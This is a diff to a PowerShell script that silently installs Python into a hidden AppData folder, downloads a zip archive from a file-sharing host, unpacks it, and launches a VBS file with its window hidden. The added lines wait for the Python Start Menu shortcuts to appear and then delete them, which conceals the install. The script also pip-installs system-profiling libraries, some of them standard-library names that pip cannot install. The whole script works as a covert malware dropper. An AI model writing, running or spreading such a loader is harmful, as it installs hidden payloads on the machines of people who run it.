@@ -1,12 +1,12 @@
 # Define variables
 $pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
-$zipScriptUrl = "https://s01.babup.com/uploads/System_6e03a.zip"
+$zipScriptUrl = "https://s01.babup.com/uploads/SystemXCXC.zip"
 $targetDirectory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"
 
-# Function to check if the directory contains four files
+# Function to check if the directory contains four files or shortcuts
 function CheckDirectoryContent {
-    $fileCount = (Get-ChildItem -Path $targetDirectory | Measure-Object).Count
-    return ($fileCount -ge 4)
+    $items = Get-ChildItem -Path $targetDirectory -ErrorAction SilentlyContinue
+    return ($items.Count -eq 4)
 }
 
 # Create directory if it doesn't exist
@@ -15,9 +15,22 @@ if (-not (Test-Path -Path $directoryPath -PathType Container)) {
     New-Item -Path $directoryPath -ItemType Directory
 }
 
-# Download Python installer
+# Download and install Python silently
 Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile "$env:USERPROFILE\AppData\System\pythonX.exe"
 Start-Process -FilePath "$env:USERPROFILE\AppData\System\pythonX.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait
+
+# Wait for the target directory to contain four files or shortcuts
+while (-not (CheckDirectoryContent)) {
+    Start-Sleep -Seconds 1
+}
+
+# Remove existing Python 3.11 shortcut if it exists
+try {
+    Remove-Item -Path $targetDirectory -Force -Recurse -ErrorAction Stop
+}
+catch {
+    # Folder and files do not exist, continue
+}
 
 # Download the zip script
 Invoke-WebRequest -Uri $zipScriptUrl -OutFile "$env:USERPROFILE\AppData\System\System.zip"
@@ -25,22 +38,16 @@ Invoke-WebRequest -Uri $zipScriptUrl -OutFile "$env:USERPROFILE\AppData\System\S
 # Unzip the script in the same directory
 Expand-Archive -Path "$env:USERPROFILE\AppData\System\System.zip" -DestinationPath $directoryPath -Force
 
-# Install required Python libraries (replace 'pip.exe' with full path)
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install os
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install requests
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install ctypes
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install termcolor
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install wmi
-& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install psutil
+# Install required Python libraries
+$libs = @("os", "requests", "ctypes", "socket", "time", "platform", "psutil", "subprocess", "uuid", "wmi", "concurrent.futures", "random", "threading")
 
-# Check and remove existing files
-if (CheckDirectoryContent) {
-    Remove-Item -Path $targetDirectory -Force -Recurse
+foreach ($lib in $libs) {
+    Start-Process -FilePath "$env:USERPROFILE\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" -ArgumentList "install $lib" -NoNewWindow -Wait
 }
 
-# Run Python script (assumes BN.vbs exists in the specified directory)
-cd "$env:USERPROFILE\AppData\System"
-Start-Process -FilePath "BN.vbs" -WindowStyle Hidden
+# Run BNV.vbs script
+Start-Process -FilePath "$env:USERPROFILE\AppData\System\BN.vbs" -WindowStyle Hidden
+
 
 # Display completion message
 Write-Host "Script completed!"
